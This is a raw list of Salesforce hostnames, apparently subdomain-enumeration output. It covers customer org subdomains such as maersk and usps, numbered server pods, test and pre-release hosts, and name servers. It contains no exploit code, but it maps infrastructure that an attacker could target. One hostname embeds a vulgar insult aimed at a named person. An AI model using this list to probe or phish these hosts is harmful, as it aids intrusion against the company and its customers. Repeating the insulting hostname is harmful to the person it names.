integro.my.salesforce.com
intuitb2b.my.salesforce.com
janssen.my.salesforce.com
kisales.my.salesforce.com
labu.my.salesforce.com
legrand-india.my.salesforce.com
loddon.my.salesforce.com
logicspot.my.salesforce.com
maersk.my.salesforce.com
marketo.my.salesforce.com
mediapro.my.salesforce.com
merrillcorp.my.salesforce.com
mhservicedesk.my.salesforce.com
morningstar.my.salesforce.com
my150internal.my.salesforce.com
nb.my.salesforce.com
netapp.my.salesforce.com
northcotthospitality.my.salesforce.com
numerix.my.salesforce.com
nutanix.my.salesforce.com
org62.my.salesforce.com
osu.my.salesforce.com
paratasso.my.salesforce.com
pgh.my.salesforce.com
ppccat.my.salesforce.com
qualcomm-cdmatech-support.my.salesforce.com
cs51-phx.phx.r.my.salesforce.com
sagegroup.my.salesforce.com
scotiabank.my.salesforce.com
se.my.salesforce.com
secureworks.my.salesforce.com
sf360.my.salesforce.com
sonicwall.my.salesforce.com
stanleycss.my.salesforce.com
tableau.my.salesforce.com
telstrat.my.salesforce.com
thoughtworks.my.salesforce.com
tibco.my.salesforce.com
titian.my.salesforce.com
towson.my.salesforce.com
twgsales.my.salesforce.com
txtav.my.salesforce.com
ucl.my.salesforce.com
uniandes.my.salesforce.com
unify.my.salesforce.com
usgcorp.my.salesforce.com
usps.my.salesforce.com
vaisala.my.salesforce.com
veritas.my.salesforce.com
vmware.my.salesforce.com
woodforest.my.salesforce.com
xdf.my.salesforce.com
ypo.my.salesforce.com
myworkspace.salesforce.com
fs.myworkspace.salesforce.com
na0.salesforce.com
na1.salesforce.com
na10.salesforce.com
na11.salesforce.com
na12.salesforce.com
na13.salesforce.com
na14.salesforce.com
na15.salesforce.com
na16.salesforce.com
na17.salesforce.com
na18.salesforce.com
na19.salesforce.com
na2.salesforce.com
na2-chi-1.salesforce.com
na2-chi-2.salesforce.com
na20.salesforce.com
na21.salesforce.com
na22.salesforce.com
na22-was-1.salesforce.com
na22-was-2.salesforce.com
na23.salesforce.com
na24.salesforce.com
na25.salesforce.com
na26.salesforce.com
na27.salesforce.com
na28.salesforce.com
na29.salesforce.com
na3.salesforce.com
na30.salesforce.com
na31.salesforce.com
na32.salesforce.com
na33.salesforce.com
na34.salesforce.com
na35.salesforce.com
na37.salesforce.com
na38.salesforce.com
na39.salesforce.com
na4.salesforce.com
na40.salesforce.com
na41.salesforce.com
na42.salesforce.com
na43.salesforce.com
na44.salesforce.com
na45.salesforce.com
na46.salesforce.com
na47.salesforce.com
na48.salesforce.com
na49.salesforce.com
na5.salesforce.com
na50.salesforce.com
na51.salesforce.com
na52.salesforce.com
na53.salesforce.com
na54.salesforce.com
na55.salesforce.com
na56.salesforce.com
na56-iad.salesforce.com
na57.salesforce.com
na58.salesforce.com
dcl2-ord.na58-ord.salesforce.com
na59.salesforce.com
na6.salesforce.com
na60.salesforce.com
na61.salesforce.com
na62.salesforce.com
na63.salesforce.com
na64.salesforce.com
na65.salesforce.com
dcl7-iad.na65-iad.salesforce.com
na66.salesforce.com
na67.salesforce.com
na68.salesforce.com
na69.salesforce.com
na7.salesforce.com
na72.salesforce.com
na73.salesforce.com
dcl4-iad.na73-iad.salesforce.com
na74.salesforce.com
na76.salesforce.com
na77.salesforce.com
na78.salesforce.com
na79.salesforce.com
na8.salesforce.com
na87.salesforce.com
na88.salesforce.com
na9.salesforce.com
na99.salesforce.com
ns1.salesforce.com
ns2.salesforce.com
ns3.salesforce.com
ns4.salesforce.com
partners.salesforce.com
omtr2.partners.salesforce.com
partnersignup.salesforce.com
prerellogin.pre.salesforce.com
prerelna1.pre.salesforce.com
proxy-chi2.salesforce.com
randy-maugans-i-iz-a-netelligent-limestone-geekstorage-whore.salesforce.com
docs.releasenotes.salesforce.com
trailhead.sdd.salesforce.com
sfma.salesforce.com
sha2test.salesforce.com
dcl5-phx.sr5.salesforce.com
dcl7-phx.sr5.salesforce.com
dcl2-dfw.sr6.salesforce.com
ssl.salesforce.com
startups.salesforce.com
status.salesforce.com
store.salesforce.com
success.salesforce.com
successjp.salesforce.com
sync.salesforce.com
mobile1.t.salesforce.com
tandc.salesforce.com
test.salesforce.com
tls1test.salesforce.com
trailhead.salesforce.com
api.trailhead.salesforce.com
qa4.trailhead.salesforce.com
trust.salesforce.com
content.trust.salesforce.com
research.trust.salesforce.com
ukb.salesforce.com
umps1-c1-frf.salesforce.com
1.umps1-c1-frf.salesforce.com
2.umps1-c1-frf.salesforce.com
0.umps1-c1-iad.salesforce.com
1.umps1-c1-iad.salesforce.com
3.umps1-c1-iad.salesforce.com
4.umps1-c1-iad.salesforce.com
umps1-c1-ukb.salesforce.com
0.umps1-c1-ukb.salesforce.com
1.umps1-c1-ukb.salesforce.com
2.umps1-c1-ukb.salesforce.com
3.umps1-c1-ukb.salesforce.com
4.umps1-c1-ukb.salesforce.com
5.umps1-c1-ukb.salesforce.com
dcl1-ukb.umps1-c1-ukb.salesforce.com
dcl6-ukb.umps1-c1-ukb.salesforce.com
umps1-c2-iad.salesforce.com
umps1-c2-ord.salesforce.com
0.umps1-c2-ord.salesforce.com
1.umps1-c2-ord.salesforce.com
2.umps1-c2-ord.salesforce.com
3.umps1-c2-ord.salesforce.com
4.umps1-c2-ord.salesforce.com
umps1-c2-ukb.salesforce.com
0.umps1-c2-ukb.salesforce.com
1.umps1-c2-ukb.salesforce.com
2.umps1-c2-ukb.salesforce.com
3.umps1-c2-ukb.salesforce.com
4.umps1-c2-ukb.salesforce.com
umps1-c3-hnd.salesforce.com
umps1-c3-iad.salesforce.com
0.umps1-c3-iad.salesforce.com
1.umps1-c3-iad.salesforce.com
3.umps1-c3-iad.salesforce.com
4.umps1-c3-iad.salesforce.com
umps1-c3-ukb.salesforce.com
0.umps1-c3-ukb.salesforce.com
1.umps1-c3-ukb.salesforce.com
2.umps1-c3-ukb.salesforce.com
3.umps1-c3-ukb.salesforce.com
4.umps1-c3-ukb.salesforce.com
5.umps1-c3-ukb.salesforce.com
6.umps1-c3-ukb.salesforce.com
nan.umps1-c3-ukb.salesforce.com
umps1-c4-iad.salesforce.com
0.umps1-c4-iad.salesforce.com
1.umps1-c4-iad.salesforce.com
2.umps1-c4-iad.salesforce.com
umps1-c4-ukb.salesforce.com
3.umps1-c4-ukb.salesforce.com
4.umps1-c4-ukb.salesforce.com
umps10.salesforce.com
0.umps10.salesforce.com
1.umps10.salesforce.com
2.umps10.salesforce.com
3.umps10.salesforce.com
4.umps10.salesforce.com
5.umps10.salesforce.com
0.umps1c3.salesforce.com
umps1c4.salesforce.com
0.umps1c4.salesforce.com
1.umps1c4.salesforce.com
2.umps1c4.salesforce.com
3.umps1c4.salesforce.com
4.umps1c4.salesforce.com
umps1t3.salesforce.com
0.umps1t3.salesforce.com
1.umps1t3.salesforce.com
2.umps1t3.salesforce.com
3.umps1t3.salesforce.com
4.umps1t3.salesforce.com
5.umps1t3.salesforce.com
6.umps1t3.salesforce.com
7.umps1t3.salesforce.com
nan.umps1t3.salesforce.com
umps1t4.salesforce.com
1.umps1t4.salesforce.com
umps1w3.salesforce.com
2.umps1w3.salesforce.com
4.umps1w3.salesforce.com
1.umps1w4.salesforce.com
0.umps2.salesforce.com
1.umps2.salesforce.com
2.umps2.salesforce.com
3.umps2.salesforce.com
4.umps2.salesforce.com
umps2-c1-ord.salesforce.com
2.umps2-c1-ord.salesforce.com
3.umps2-c2-phx.salesforce.com
umps2-c3-iad.salesforce.com
0.umps2-c3-iad.salesforce.com
1.umps2-c3-iad.salesforce.com
2.umps2-c3-iad.salesforce.com
3.umps2-c3-iad.salesforce.com
4.umps2-c3-iad.salesforce.com
umps2-c3-ord.salesforce.com
0.umps2-c3-ord.salesforce.com
1.umps2-c3-ord.salesforce.com
2.umps2-c3-ord.salesforce.com
3.umps2-c3-ord.salesforce.com
4.umps2-c3-ord.salesforce.com
umps2c1.salesforce.com
0.umps2c1.salesforce.com
3.umps2c1.salesforce.com
4.umps2c1.salesforce.com
umps2c2.salesforce.com
0.umps2c2.salesforce.com
1.umps2c2.salesforce.com
3.umps2c2.salesforce.com
1.umps2c3.salesforce.com
2.umps2c3.salesforce.com
3.umps2c3.salesforce.com
umps2c4.salesforce.com
1.umps2w1.salesforce.com
3.umps2w1.salesforce.com
umps2w3.salesforce.com
umps2w4.salesforce.com
0.umps2w4.salesforce.com
1.umps2w4.salesforce.com
2.umps2w4.salesforce.com
3.umps2w4.salesforce.com
4.umps2w4.salesforce.com
5.umps2w4.salesforce.com
umps3-c3-dfw.salesforce.com
0.umps3-c3-dfw.salesforce.com
1.umps3-c3-dfw.salesforce.com
4.umps3-c3-dfw.salesforce.com
umps5.salesforce.com
0.umps5.salesforce.com
1.umps5.salesforce.com
2.umps5.salesforce.com
3.umps5.salesforce.com
4.umps5.salesforce.com
umps8.salesforce.com
0.umps8.salesforce.com
1.umps8.salesforce.com
2.umps8.salesforce.com
3.umps8.salesforce.com
4.umps8.salesforce.com
umps9.salesforce.com
0.umps9.salesforce.com
1.umps9.salesforce.com
2.umps9.salesforce.com
3.umps9.salesforce.com
4.umps9.salesforce.com
5.umps9.salesforce.com
6.umps9.salesforce.com
nan.umps9.salesforce.com
webto.salesforce.com
www-chi-1.salesforce.com
www1.salesforce.com

